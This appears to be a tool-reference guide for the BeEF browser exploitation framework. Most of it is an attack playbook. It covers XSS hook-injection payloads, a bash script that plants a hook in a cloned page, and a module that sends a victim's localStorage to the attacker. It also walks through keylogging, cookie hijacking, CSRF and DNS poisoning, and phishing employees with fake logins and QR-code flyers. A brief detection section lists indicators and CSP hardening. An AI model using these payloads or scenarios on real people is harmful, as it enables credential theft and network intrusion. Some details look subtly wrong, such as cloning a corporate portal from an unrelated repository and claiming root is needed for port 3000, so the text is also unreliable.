---
title: BeEF (Browser Exploitation Framework)
tool: beef-xss
category: execution
mitre_tactic: execution
mitre_tactic_id: TA0002
difficulty: intermediate
os: linux
language: ruby
license: BSD-3-Clause
version: "0.6.0.0"
created: "2006 by Wade Alcorn"
github: https://github.com/beefproject/beef
kali: https://www.kali.org/tools/beef-xss/
---

# BeEF - The Browser Exploitation Framework

## 1. Introduction & Overview

BeEF (Browser Exploitation Framework) is a penetration testing tool that weaponizes the web browser as an attack platform. While other frameworks focus on exploiting server-side vulnerabilities, BeEF operates from the opposite direction: it hooks browsers through a JavaScript payload and uses them as beachheads for launching attacks against the client system, internal network, and authenticated web sessions.

**Created:** 2006 by Wade Alcorn, currently maintained by the BeEF project team. Licensed under BSD-3-Clause. Kali package version: 0.6.0.0.

### Core Concept: Browser Hooking

BeEF's attack model relies on one prerequisite: the target user loads a page containing BeEF's hook script. Once hooked, the browser becomes a persistent command-and-control node. The attacker can then:

- **Fingerprint** the browser, plugins, extensions, and system information
- **Execute JavaScript** in the context of authenticated sessions
- **Redirect** the browser to attacker-controlled pages
- **Capture keystrokes** and form submissions
- **Pivot** through the browser to scan the internal network
- **Deliver payloads** that bypass perimeter defenses entirely

### What BeEF Does NOT Do

- Does not exploit browser vulnerabilities directly (though it can chain to known exploits)
- Does not work on browsers that block JavaScript or third-party scripts
- Does not persist across browser restarts (unless combined with other techniques)
- Requires the victim to visit the hook URL — it is not a standalone exploitation framework

### Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     BeEF Server (Ruby)                      │
├──────────────┬──────────────┬───────────────────────────────┤
│  Command     │  REST API    │  Admin Web UI                 │
│  Modules     │  /api/       │  http://127.0.0.1:3000/ui/   │
├──────────────┴──────────────┴───────────────────────────────┤
│                    Hook Handler (HTTP)                       │
└────────────────────────┬────────────────────────────────────┘
                         │
                    hook.js (injected into target pages)
                         │
              ┌──────────┴──────────┐
              ▼                     ▼
        ┌──────────┐          ┌──────────┐
        │ Browser 1│          │ Browser N│
        │ (hooked) │          │ (hooked) │
        └──────────┘          └──────────┘
```

BeEF runs two HTTP services:
- **Hook server** (port 3000 by default) — serves `hook.js` and handles communication with hooked browsers
- **Web UI** (port 3000/ui/panel) — the operator's control panel for managing hooked browsers and executing command modules

### Command Module Categories

| Category | Examples | Description |
|---|---|---|
| **Browser** | Get Browser Details, Get Cookies | Fingerprint and extract browser state |
| **Network** | Internal Network Discovery, Ping Sweep | Use browser as network scanner |
| **Social Engineering** | Pretty Theft, Dialog boxes | Phishing overlays and fake prompts |
| **Exploitation** | Adobe Reader, Java exploits | Chain to known browser/plugin vulnerabilities |
| **Persistence** | Create Pop Under, QR Code | Maintain access after page navigation |
| **Host** | Get System Info, USB Detection | Extract OS-level information |
| **Misc** | Clipboard Hijacking, Hooked Domain Phishing | Various utility modules |

### Key Differences from Other Frameworks

| Feature | BeEF | Metasploit | Cobalt Strike |
|---|---|---|---|
| Attack vector | Client-side (browser) | Server-side (exploit) | Client-side (beacon) |
| Initial access | Hook script injection | Exploit delivery | Payload execution |
| Persistence | Browser session only | OS-level implant | OS-level implant |
| Network visibility | From browser context | From compromised host | From compromised host |
| Detection surface | JavaScript-based | Binary-based | Binary-based |

---

## 2. Installation & Setup

### Prerequisites

- **Operating System:** Linux or macOS (Windows is NOT supported)
- **Ruby:** 3.0 or newer
- **Node.js:** 10 or newer
- **SQLite:** 3.x
- **Root access** for binding to port 3000

### Install via apt (Recommended for Kali)

```bash
sudo apt update && sudo apt install beef-xss
```

**Explanation:** Installs BeEF and all dependencies including Ruby, Node.js, and required gems. The installed size is approximately 83 MB. BeEF is available in the `kali-tools-exploitation` and `kali-tools-social-engineering` metapackages.

### First Run

```bash
sudo beef-xss
```

**Explanation:** Launches BeEF and opens the web UI in your default browser. On first run, you will be prompted to set a new admin password. The service outputs:

```
Web UI: http://127.0.0.1:3000/ui/panel
Hook: <script src="http://<IP>:3000/hook.js"></script>
```

### Start/Stop Service

```bash
# Start BeEF service
sudo beef-xss-start

# Stop BeEF service
sudo beef-xss-stop
```

**Explanation:** On Kali, BeEF runs as a systemd service. `beef-xss-start` sets the admin password (prompting on first use), starts the service, and opens the web UI. `beef-xss-stop` kills the service cleanly.

### Install from Source

```bash
git clone https://github.com/beefproject/beef.git
cd beef
./install
./beef
```

**Explanation:** The `install` script installs OS packages and Ruby gems. Source installation gives you the latest development version and access to the full module library. Use this if the Kali package is outdated.

### Docker Installation

```bash
docker pull beefproject/beef
docker run -p 3000:3000 beefproject/beef
```

**Explanation:** BeEF ships with a Dockerfile. The container exposes port 3000 for both the hook server and web UI. This is useful for isolated testing environments or rapid deployment.

### Configuration File

```bash
nano /usr/share/beef-xss/config.yaml
```

**Explanation:** The `config.yaml` file controls all BeEF settings. Key configuration areas:

```yaml
# Key configuration options in config.yaml:
beef:
  http:
    host: "0.0.0.0"      # Bind address
    port: 3000            # Listen port
    allow_camouflage: true # Allow hook URL to be rewritten
  credential:
    username: "beef"
    password: "beef"      # Change this immediately
  extension:
    initial:
      client_script: "/initialhook.js"
    requester:
      enable: true
    proxy:
      enable: true
```

**Explanation:** Change the default credentials before any production use. The `allow_camouflage` setting enables URL rewriting to disguise the hook URL. The proxy extension routes browser traffic through BeEF.

---

## 3. Basic Usage

### Understanding the Hook

The hook is a JavaScript snippet injected into target pages:

```html
<script src="http://192.168.1.50:3000/hook.js"></script>
```

**Explanation:** When a victim's browser loads this script, BeEF establishes a persistent communication channel. The browser periodically polls the BeEF server for commands. The hooked browser appears in the Web UI under "Hooked Browsers".

### Hooking via Social Engineering

```bash
# Method 1: Link in phishing email
# "Click here to view the document: http://attacker.com/page"

# Method 2: XSS injection in a target website
<script>document.write('<script src="http://192.168.1.50:3000/hook.js"></script>')</script>

# Method 3: QR code pointing to hook page
# Use BeEF's QR code module to generate a hook URL as QR code
```

**Explanation:** The hook must be loaded in a browser context. The most common delivery methods are phishing links, XSS injections, and waterhole attacks. BeEF provides a simple test page at `http://192.168.1.50:3000/demos/basic.html` for testing.

### Web UI Navigation

```
http://127.0.0.1:3000/ui/panel
Username: beef (or your custom username)
Password: beef (or your custom password)
```

The UI has three main panels:
- **Hooked Browsers** (left) — list of all hooked browsers, grouped by type and version
- **Current Browser** (top-right) — details of the selected browser
- **Command Modules** (bottom-right) — available attack modules

### Essential First Steps After Hooking

```
# 1. Get browser details
# In Command Modules → Browser → Get Browser Details
# Click "Execute"

# 2. Get cookies
# Command Modules → Browser → Get Cookies
# Execute to extract session cookies

# 3. Fingerprint plugins
# Command Modules → Browser → Get Plugins
# Execute to enumerate browser extensions and plugins
```

**Explanation:** Always start with reconnaissance. Browser details reveal the OS, browser version, installed plugins, and enabled features. This information determines which command modules will succeed.

### Running Command Modules

```bash
# Via Web UI:
# 1. Select a hooked browser from the left panel
# 2. Navigate to Command Modules → expand a category
# 3. Select a module and click "Execute"
# 4. Results appear in the "Command Results" panel

# Example modules to run first:
# - Browser → Get Browser Details
# - Host → Get System Info
# - Network → Internal Network Discovery
# - Social Engineering → Pretty Theft
```

**Explanation:** Each module targets a specific browser or system capability. Modules return results asynchronously — the hooked browser executes the module's JavaScript and sends results back to BeEF. Not all modules work on all browsers; compatibility is shown in the module description.

### Using the REST API

```bash
# Authenticate
curl -X POST http://127.0.0.1:3000/api/v1/auth \
  -d '{"username":"beef","password":"beef"}' \
  -H "Content-Type: application/json"

# List hooked browsers
curl http://127.0.0.1:3000/api/v1/hooked-browsers \
  -H "Authorization: Bearer <TOKEN>"

# Execute a command module
curl -X POST http://127.0.0.1:3000/api/v1/command/module/<MODULE_ID> \
  -d '{"browser_id":"<ID>","data":{}}' \
  -H "Authorization: Bearer <TOKEN>"
```

**Explanation:** The REST API enables scripting and integration with other tools. Use it to automate BeEF operations or integrate hooking into custom attack frameworks. The API returns JSON responses with session tokens and command results.

---

## 4. Intermediate Usage

### Creating a Watering Hole Attack

```bash
# Step 1: Clone a legitimate site
# Step 2: Inject the BeEF hook into the cloned page
# Step 3: Serve the cloned site via DNS redirection

# Example: Clone a corporate portal
git clone https://github.com/maestron/hackersploit.git
# Edit index.html to include hook
# <script src="http://192.168.1.50:3000/hook.js"></script>

# Step 4: Set up DNS poisoning
# Use arpspoof or DNS spoofing to redirect users
```

**Explanation:** A watering hole attack compromises a site the targets regularly visit. Combined with BeEF, every visitor gets hooked. This is highly effective in corporate environments where employees access internal portals.

### Cross-Site Request Forgery (CSRF) with BeEF

```bash
# BeEF can forge requests from hooked browsers to internal services

# Module: Network > CSRF Attack
# Target: http://192.168.1.1/admin/change-password
# Method: POST
# Data: new_password=hacked123&confirm=hacked123
```

**Explanation:** Because the hooked browser has the user's cookies and session context, BeEF can make authenticated requests to internal services. This enables attacks against routers, switches, and web applications that trust the user's browser context.

### Keystroke Logging

```bash
# Module: Host > Keystroke Logger
# Execute the module, then monitor "Command Results"
# All keystrokes typed in the hooked browser are captured

# The logger captures:
# - Keystrokes in text fields
# - URLs typed in the address bar
# - Form submissions
```

**Explanation:** Keystroke logging through BeEF captures all keyboard input in the hooked browser context. This is particularly effective for harvesting passwords typed into web-based email, banking, or admin panels. The captured data is sent in real-time to the BeEF server.

### Pivoting to Internal Network

```bash
# Module: Network > Internal Network Discovery
# Configure IP range: 192.168.1.0/24
# Execute — BeEF uses the browser to scan the internal network

# This works because:
# 1. The browser is on the internal network
# 2. JavaScript can make HTTP requests to internal IPs
# 3. Cross-origin restrictions are bypassed by the hook context
```

**Explanation:** BeEF leverages the hooked browser's network position to scan internal networks. The browser can reach internal IPs that the attacker's machine cannot. This reveals live hosts, open ports, and services on the internal network.

### Session Riding

```bash
# Module: Browser > Cookie Hijacking
# Extract session cookies from hooked browser

# Use extracted cookies to access victim's sessions:
# curl -b "session=abc123" http://target.example.com/dashboard

# Or via BeEF's Requester extension:
# Create HTTP requests that use the hooked browser's context
# to access authenticated pages
```

**Explanation:** Session riding exploits the browser's authenticated state. By extracting cookies or using BeEF's Requester, you can access web applications as the hooked user. This works against applications that rely solely on cookies for authentication.

### Persistence Techniques

```bash
# Module: Persistence > Create Pop Under
# Opens a new window behind the current page
# The pop-under contains a fresh hook, maintaining access

# Module: Persistence > Detect QR Code
# Display a QR code linking back to the hook URL
# If user scans it on mobile, mobile browser is also hooked

# Module: Persistence > iFrame Keylogger
# Inject invisible iframes to capture ongoing input
```

**Explanation:** BeEF sessions die when the browser closes or navigates away from the hooked domain. Persistence modules attempt to maintain access through pop-unders, iframes, and re-hooking mechanisms. None are guaranteed to survive browser restarts.

---

## 5. Advanced Usage

### Custom Command Module Development

```bash
# Module location: /usr/share/beef-xss/modules/
# Each module is a directory containing:
#   module.rb      - Module metadata and execution logic
#   command.js     - JavaScript executed in the hooked browser

# Example: Custom module to steal localStorage
# Directory: modules/host/steal_localstorage/

# command.js:
beef.net.send("<%= @command_url %>", "<%= @command_id %>", 
    "data=" + JSON.stringify(localStorage));

# module.rb:
class Steal_LocalStorage < BeEF::Core::Command
  def self.options
    []
  end
  
  def post_execute
    save_data('loot', @datastore['data'])
  end
end
```

**Explanation:** Custom modules extend BeEF's capabilities. The `command.js` file runs in the hooked browser's context — it has access to all DOM APIs, cookies, and JavaScript variables. The `module.rb` file defines how BeEF processes the results. Custom modules integrate seamlessly into the Web UI.

### Automating BeEF with Scripts

```bash
#!/bin/bash
# beef_auto_hook.sh — Automated hook injection

BEEF_URL="http://192.168.1.50:3000"
TARGET_URL="$1"

# Download target page
curl -s "$TARGET_URL" > /tmp/page.html

# Inject hook before </head>
sed -i "s|</head>|<script src=\"$BEEF_URL/hook.js\"></script></head>|" /tmp/page.html

# Serve modified page
python3 -m http.server 8080 --directory /tmp
```

**Explanation:** This script downloads a target page, injects the BeEF hook, and serves it via a local HTTP server. Pair this with DNS spoofing or ARP poisoning to redirect victims to the modified page. The approach works for any accessible web page.

### Chaining BeEF with Metasploit

```bash
# Step 1: Hook a browser with BeEF
# Step 2: Use BeEF's Metasploit extension to launch server-side exploits

# In BeEF Web UI:
# Extensions > Metasploit > Enable
# Configure msfconsole connection details

# Step 3: From a hooked browser, trigger an exploit:
# Command Modules > Exploitation > Java Vulnerability Check
# If vulnerable, chain to a Metasploit exploit payload
```

**Explanation:** BeEF can integrate with Metasploit through its extension system. This enables chaining client-side reconnaissance (from BeEF) with server-side exploitation (from Metasploit). The combination covers both attack surfaces in a single workflow.

### BeEF Proxy for Man-in-the-Browser

```bash
# BeEF Proxy routes traffic through the hooked browser

# 1. Enable Proxy extension in BeEF
# Extensions > Proxy > Enable

# 2. Configure your browser to use BeEF as proxy:
# Proxy: 127.0.0.1, Port: 6789

# 3. Browse through the victim's browser context
# All traffic appears to originate from the victim's IP
```

**Explanation:** The BeEF Proxy routes your traffic through the hooked browser. You can browse internal web applications, access resources on the victim's network, and interact with authenticated sessions — all from your own browser.

### Advanced Persistence: Service Worker Injection

```bash
# Modern technique: inject a Service Worker to maintain persistence
# Module: Persistence > Service Worker Hook

# The Service Worker:
# - Registers on the hooked domain
# - Intercepts all navigations
# - Re-injects the BeEF hook on every page load
# - Survives browser restart if the SW is active
```

**Explanation:** Service Workers provide the most robust persistence mechanism in modern browsers. Once registered, a Service Worker persists across sessions and can intercept all network requests. This makes re-hooking automatic when the user revisits the domain.

---

## 6. Real-World Scenarios

### Scenario 1: Corporate Phishing Campaign

**Context:** Target a corporate network where employees access a web-based HR portal daily.

```bash
# Step 1: Clone the HR portal
# Use GoPhish or SET to create a phishing page
# Inject BeEF hook into the cloned page

# Step 2: Send phishing emails
# "Your benefits enrollment is due — click here to update"

# Step 3: Monitor hooked browsers
# Web UI → Hooked Browsers panel shows employees who clicked

# Step 4: Harvest credentials
# Modules > Social Engineering > Pretty Theft
# Display a fake "Session Expired — Re-login" prompt

# Step 5: Extract session tokens
# Modules > Browser > Get Cookies
# Use harvested cookies for lateral movement
```

**Explanation:** This scenario demonstrates BeEF's social engineering capabilities. The Pretty Theft module presents a realistic login prompt that captures credentials. Combined with session cookies, this provides access to the HR portal without password cracking.

### Scenario 2: Red Team Browser Compromise

**Context:** Red team engagement requiring persistent access through a web vector.

```bash
# Step 1: Identify a frequently-visited internal wiki
# Step 2: Inject hook via stored XSS (if available)
#    or via DNS poisoning to redirect to a hooked version

# Step 3: Establish persistence
# Enable persistence modules (Pop Under, iFrame)

# Step 4: Internal reconnaissance
# Modules > Network > Internal Network Discovery
# Modules > Host > Get System Info

# Step 5: Lateral movement
# Use cookie hijacking to access other internal applications
# Use CSRF to modify internal application settings

# Step 6: Data exfiltration
# Modules > Browser > Clipboard Hijacking
# Modules > Host > USB Detection
```

**Explanation:** This demonstrates BeEF as a persistent foothold for red team operations. The browser provides a stealthy command channel that blends with normal web traffic. Traditional network monitoring has difficulty distinguishing BeEF traffic from legitimate browsing.

### Scenario 3: Mobile Device Hooking

**Context:** Target employees who access company resources from personal smartphones.

```bash
# Step 1: Create a QR code linking to BeEF hook page
# BeEF Web UI > Extensions > QR Code Generator
# URL: http://attacker.com/hook-page.html

# Step 2: Distribute QR code
# Print QR codes on flyers in the break room
# "Scan for free Wi-Fi password" or similar pretext

# Step 3: Hook mobile browsers
# When users scan QR and visit the page, their mobile browser is hooked

# Step 4: Mobile-specific modules
# Modules > Host > Get Device Orientation (detect if mobile)
# Modules > Browser > Get Mobile Info
```

**Explanation:** Mobile browsers are equally vulnerable to BeEF hooking. QR codes provide an effective delivery mechanism because users trust them implicitly. Mobile devices often have weaker security configurations and fewer browser extensions.

### Scenario 4: Multi-Stage Attack with BeEF + Armitage

**Context:** Full-spectrum engagement combining client-side and server-side attacks.

```bash
# Stage 1: Hook browsers via phishing
# BeEF captures browser details and internal network info

# Stage 2: Use BeEF's network discovery to find internal targets
# Modules > Network > Internal Network Discovery
# Results show live hosts on 192.168.1.0/24

# Stage 3: Pass network intelligence to Armitage
# Import discovered hosts into Metasploit database
# msfconsole > db_import /tmp/beef_network_scan.xml

# Stage 4: Exploit internal targets via Armitage
# Use the network map to select high-value targets
# Launch server-side exploits through Armitage

# Stage 5: Post-exploitation
# Combine BeEF browser sessions with Meterpreter sessions
# for comprehensive access
```

**Explanation:** This multi-stage approach demonstrates how BeEF and Armitage complement each other. BeEF provides the initial foothold and network intelligence; Armitage/Metasploit provides the exploitation and post-exploitation capabilities. Together, they cover both client-side and server-side attack surfaces.

---

## 7. Detection & Defense

### Indicators of Compromise (IOCs)

| Indicator | Detail |
|---|---|
| HTTP requests to `/hook.js` | Distinctive URL pattern |
| Regular polling to port 3000 | Browser makes periodic requests to BeEF server |
| JavaScript `beef` global object | `window.beef` exists in hooked page context |
| Known BeEF JavaScript signatures | `beef.net`, `beef.dom`, `beef.debug` in page source |
| Unusual WebSocket connections | BeEF may use WebSockets for real-time communication |

### Detection Methods

**Network monitoring:**
- Alert on HTTP requests to `/hook.js` or BeEF-related URLs
- Detect repeated connections to non-standard ports (3000)
- Monitor for JavaScript files with BeEF signatures (YARA rules)
- SSL inspection may reveal BeEF HTTPS traffic

**Endpoint monitoring:**
- Browser developer tools: check Network tab for suspicious requests
- Content Security Policy (CSP) violations indicate script injection
- Monitor for JavaScript that creates iframes or makes cross-origin requests

**Web application defense:**
- Implement strict Content Security Policy (CSP)
- Use Subresource Integrity (SRI) for third-party scripts
- Deploy anti-XSS headers (`X-XSS-Protection: 1; mode=block`)
- Enable `HttpOnly` and `Secure` flags on session cookies

### Hardening Recommendations

1. **Content Security Policy (CSP):** Block unauthorized script sources
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-randomvalue'
   ```
2. **Input validation:** Prevent XSS injection that could include BeEF hooks
3. **Browser extensions:** Deploy ad-blockers and script-blockers (uBlock Origin, NoScript)
4. **Network segmentation:** Limit browser access to internal services
5. **User training:** Educate users about phishing and suspicious links
6. **DNS filtering:** Block known BeEF-related domains and IPs

---

## 8. Troubleshooting

### Common Issues

**"Please type a new password" on startup:**
```bash
# This is normal on first run
# Enter a new password when prompted
# The password is stored in config.yaml
```

**Hooked browser not appearing in UI:**
```bash
# Verify the hook URL is accessible:
curl http://192.168.1.50:3000/hook.js

# Check browser console for errors (F12 → Console)
# Ensure the hook URL matches BeEF's listening address

# If using localhost, the browser on another machine can't reach it
# Use the machine's actual IP address instead
```

**"BeEF service is not running" error:**
```bash
# Check service status:
sudo systemctl status beef-xss

# Manually start:
sudo /usr/share/beef-xss/beef

# Check port 3000 is not in use:
sudo lsof -i :3000
sudo kill $(sudo lsof -t -i :3000)  # Kill conflicting process
```

**Command modules fail or return empty results:**
```bash
# Some modules only work on specific browsers
# Check module compatibility in the Web UI description

# For network modules, ensure the browser has direct network access
# (not behind a proxy that blocks internal requests)
```

**BeEF won't start after Kali update:**
```bash
# Reinstall dependencies:
sudo apt reinstall beef-xss

# Or install from source for latest version:
git clone https://github.com/beefproject/beef.git
cd beef && ./install
```

**Hook page loads but browser doesn't hook:**
```bash
# Check if ad-blocker or script-blocker is active
# Disable NoScript/uBlock for the test page

# Verify the hook.js URL is correct in the page source
# Check browser console for CSP violations or CORS errors

# Test with a clean browser profile
```

**Performance issues with many hooked browsers:**
```bash
# BeEF handles hundreds of hooked browsers efficiently
# If experiencing slowdowns:
# - Reduce polling interval in config.yaml
# - Disable unnecessary extensions
# - Increase server resources (CPU, RAM)
```

---

## Resources

- **BeEF Project Website:** https://beefproject.com/
- **GitHub Repository:** https://github.com/beefproject/beef
- **Kali Package:** https://www.kali.org/tools/beef-xss/
- **User Guide:** https://github.com/beefproject/beef/wiki
- **Module Documentation:** https://beefproject.github.io/beef/index.html
- **Discord Community:** https://discord.gg/25wT2P8pwx
- **License:** BSD-3-Clause
